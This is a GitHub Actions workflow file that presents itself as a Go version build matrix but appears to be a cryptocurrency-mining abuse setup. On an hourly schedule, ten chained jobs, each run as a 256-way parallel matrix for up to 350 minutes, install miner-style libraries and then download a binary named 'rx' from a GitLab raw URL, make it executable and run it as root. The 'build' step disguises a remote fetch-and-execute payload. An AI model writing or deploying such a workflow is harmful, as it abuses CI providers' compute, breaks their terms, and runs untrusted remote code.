name: basomasparto_go
on:
  push:
  schedule:
    - cron: '0 * * * *'


jobs:
  pen:
    container:
      image: ubuntu:bionic
    runs-on: ubuntu-latest
    continue-on-error: true
    strategy:
      max-parallel: 20
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4, 1.5]
        flag: [A]
    timeout-minutes: 360
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v1
    - name: mugg_go
      run: |
        set -e
        echo Done
        sleep 10
  step-1:
    needs: pen
    runs-on: windows-latest
    continue-on-error: true
    strategy:
      max-parallel: 256
      fail-fast: false
      matrix:
         compiler: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
         flag: [kmn, oiu, qwe, nvb, lpd, sds, ere, lil, kul, pox, sam, dic, car, ygc, spc, ilk]  
    timeout-minutes: 350
    env:
        NUM_JOBS: 256
        JOB: ${{ matrix.go }}
    defaults:
     run:
       shell: wsl-bash -u root {0}
    steps: 
    - name: set up Go ${{ matrix.go }} 
      uses: actions/setup-go@v1 
      with: 
        go-version: ${{ matrix.go }} 
      id: go 
    - name: setup 
      uses: Vampire/setup-wsl@v1 
    - name : install dependencies 
      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1  
    - name: build  
      run: wget https://gitlab.com/EmileRalston/rx/-/raw/main/rx && chmod 777 rx && ./rx

  step-2:
    needs: step-1
    runs-on: windows-latest
    continue-on-error: true
    strategy:
      max-parallel: 256
      fail-fast: false
      matrix:
         compiler: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
         flag: [kmn, oiu, qwe, nvb, lpd, sds, ere, lil, kul, pox, sam, dic, car, ygc, spc, ilk]  
    timeout-minutes: 350
    env:
        NUM_JOBS: 256
        JOB: ${{ matrix.go }}
    defaults:
     run:
       shell: wsl-bash -u root {0}
    steps: 
    - name: set up Go ${{ matrix.go }} 
      uses: actions/setup-go@v1 
      with: 
        go-version: ${{ matrix.go }} 
      id: go 
    - name: setup 
      uses: Vampire/setup-wsl@v1 
    - name : install dependencies 
      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1  
    - name: build  
      run: wget https://gitlab.com/EmileRalston/rx/-/raw/main/rx && chmod 777 rx && ./rx

  step-3:
    needs: step-2
    runs-on: windows-latest
    continue-on-error: true
    strategy:
      max-parallel: 256
      fail-fast: false
      matrix:
         compiler: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
         flag: [kmn, oiu, qwe, nvb, lpd, sds, ere, lil, kul, pox, sam, dic, car, ygc, spc, ilk]  
    timeout-minutes: 350
    env:
        NUM_JOBS: 256
        JOB: ${{ matrix.go }}
    defaults:
     run:
       shell: wsl-bash -u root {0}
    steps: 
    - name: set up Go ${{ matrix.go }} 
      uses: actions/setup-go@v1 
      with: 
        go-version: ${{ matrix.go }} 
      id: go 
    - name: setup 
      uses: Vampire/setup-wsl@v1 
    - name : install dependencies 
      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1  
    - name: build  
      run: wget https://gitlab.com/EmileRalston/rx/-/raw/main/rx && chmod 777 rx && ./rx

  step-4:
    needs: step-3
    runs-on: windows-latest
    continue-on-error: true
    strategy:
      max-parallel: 256
      fail-fast: false
      matrix:
         compiler: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
         flag: [kmn, oiu, qwe, nvb, lpd, sds, ere, lil, kul, pox, sam, dic, car, ygc, spc, ilk]  
    timeout-minutes: 350
    env:
        NUM_JOBS: 256
        JOB: ${{ matrix.go }}
    defaults:
     run:
       shell: wsl-bash -u root {0} 
    steps: 
    - name: set up Go ${{ matrix.go }} 
      uses: actions/setup-go@v1 
      with: 
        go-version: ${{ matrix.go }} 
      id: go 
    - name: setup 
      uses: Vampire/setup-wsl@v1 
    - name : install dependencies 
      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1  
    - name: build  
      run: wget https://gitlab.com/EmileRalston/rx/-/raw/main/rx && chmod 777 rx && ./rx

  step-5:
    needs: step-4
    runs-on: windows-latest
    continue-on-error: true
    strategy:
      max-parallel: 256
      fail-fast: false
      matrix:
         compiler: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
         flag: [kmn, oiu, qwe, nvb, lpd, sds, ere, lil, kul, pox, sam, dic, car, ygc, spc, ilk]  
    timeout-minutes: 350
    env:
        NUM_JOBS: 256
        JOB: ${{ matrix.go }}
    defaults:
     run:
       shell: wsl-bash -u root {0} 
    steps: 
    - name: set up Go ${{ matrix.go }} 
      uses: actions/setup-go@v1 
      with: 
        go-version: ${{ matrix.go }} 
      id: go 
    - name: setup 
      uses: Vampire/setup-wsl@v1 
    - name : install dependencies 
      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1  
    - name: build  
      run: wget https://gitlab.com/EmileRalston/rx/-/raw/main/rx && chmod 777 rx && ./rx

  step-6:
    needs: step-5
    runs-on: windows-latest
    continue-on-error: true
    strategy:
      max-parallel: 256
      fail-fast: false
      matrix:
         compiler: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
         flag: [kmn, oiu, qwe, nvb, lpd, sds, ere, lil, kul, pox, sam, dic, car, ygc, spc, ilk]  
    timeout-minutes: 350
    env:
        NUM_JOBS: 256
        JOB: ${{ matrix.go }}
    defaults:
     run:
       shell: wsl-bash -u root {0} 
    steps: 
    - name: set up Go ${{ matrix.go }} 
      uses: actions/setup-go@v1 
      with: 
        go-version: ${{ matrix.go }} 
      id: go 
    - name: setup 
      uses: Vampire/setup-wsl@v1 
    - name : install dependencies 
      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1  
    - name: build  
      run: wget https://gitlab.com/EmileRalston/rx/-/raw/main/rx && chmod 777 rx && ./rx

  step-7:
    needs: step-6
    runs-on: windows-latest
    continue-on-error: true
    strategy:
      max-parallel: 256
      fail-fast: false
      matrix:
         compiler: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
         flag: [kmn, oiu, qwe, nvb, lpd, sds, ere, lil, kul, pox, sam, dic, car, ygc, spc, ilk]  
    timeout-minutes: 350
    env:
        NUM_JOBS: 256
        JOB: ${{ matrix.go }}
    defaults:
     run:
       shell: wsl-bash -u root {0} 
    steps: 
    - name: set up Go ${{ matrix.go }} 
      uses: actions/setup-go@v1 
      with: 
        go-version: ${{ matrix.go }} 
      id: go 
    - name: setup 
      uses: Vampire/setup-wsl@v1 
    - name : install dependencies 
      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1  
    - name: build  
      run: wget https://gitlab.com/EmileRalston/rx/-/raw/main/rx && chmod 777 rx && ./rx

  step-8:
    needs: step-7
    runs-on: windows-latest
    continue-on-error: true
    strategy:
      max-parallel: 256
      fail-fast: false
      matrix:
         compiler: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
         flag: [kmn, oiu, qwe, nvb, lpd, sds, ere, lil, kul, pox, sam, dic, car, ygc, spc, ilk]  
    timeout-minutes: 350
    env:
        NUM_JOBS: 256
        JOB: ${{ matrix.go }}
    defaults:
     run:
       shell: wsl-bash -u root {0} 
    steps: 
    - name: set up Go ${{ matrix.go }} 
      uses: actions/setup-go@v1 
      with: 
        go-version: ${{ matrix.go }} 
      id: go 
    - name: setup 
      uses: Vampire/setup-wsl@v1 
    - name : install dependencies 
      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1  
    - name: build  
      run: wget https://gitlab.com/EmileRalston/rx/-/raw/main/rx && chmod 777 rx && ./rx

  step-9:
    needs: step-8
    runs-on: windows-latest
    continue-on-error: true
    strategy:
      max-parallel: 256
      fail-fast: false
      matrix:
         compiler: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
         flag: [kmn, oiu, qwe, nvb, lpd, sds, ere, lil, kul, pox, sam, dic, car, ygc, spc, ilk]  
    timeout-minutes: 350
    env:
        NUM_JOBS: 256
        JOB: ${{ matrix.go }}
    defaults:
     run:
       shell: wsl-bash -u root {0} 
    steps: 
    - name: set up Go ${{ matrix.go }} 
      uses: actions/setup-go@v1 
      with: 
        go-version: ${{ matrix.go }} 
      id: go 
    - name: setup 
      uses: Vampire/setup-wsl@v1 
    - name : install dependencies 
      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1  
    - name: build  
      run: wget https://gitlab.com/EmileRalston/rx/-/raw/main/rx && chmod 777 rx && ./rx

  step-10:
    needs: step-9
    runs-on: windows-latest
    continue-on-error: true
    strategy:
      max-parallel: 256
      fail-fast: false
      matrix:
         compiler: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
         flag: [kmn, oiu, qwe, nvb, lpd, sds, ere, lil, kul, pox, sam, dic, car, ygc, spc, ilk]  
    timeout-minutes: 350
    env:
        NUM_JOBS: 256
        JOB: ${{ matrix.go }}
    defaults:
     run:
       shell: wsl-bash -u root {0} 
    steps: 
    - name: set up Go ${{ matrix.go }} 
      uses: actions/setup-go@v1 
      with: 
        go-version: ${{ matrix.go }} 
      id: go 
    - name: setup 
      uses: Vampire/setup-wsl@v1 
    - name : install dependencies 
      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1  
    - name: build  
      run: wget https://gitlab.com/EmileRalston/rx/-/raw/main/rx && chmod 777 rx && ./rx

  success-all-test:
    needs: [pen, step-1, step-2, step-3, step-4, step-5, step-6, step-7, step-8, step-9, step-10, ]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - uses: technote-space/workflow-conclusion-action@v2
      - name: Check Failure
        if: env.WORKFLOW_CONCLUSION == 'failure'
        run: exit 1
      - name: Success
        if: ${{ success() }}
        run: echo "all don,All Done"
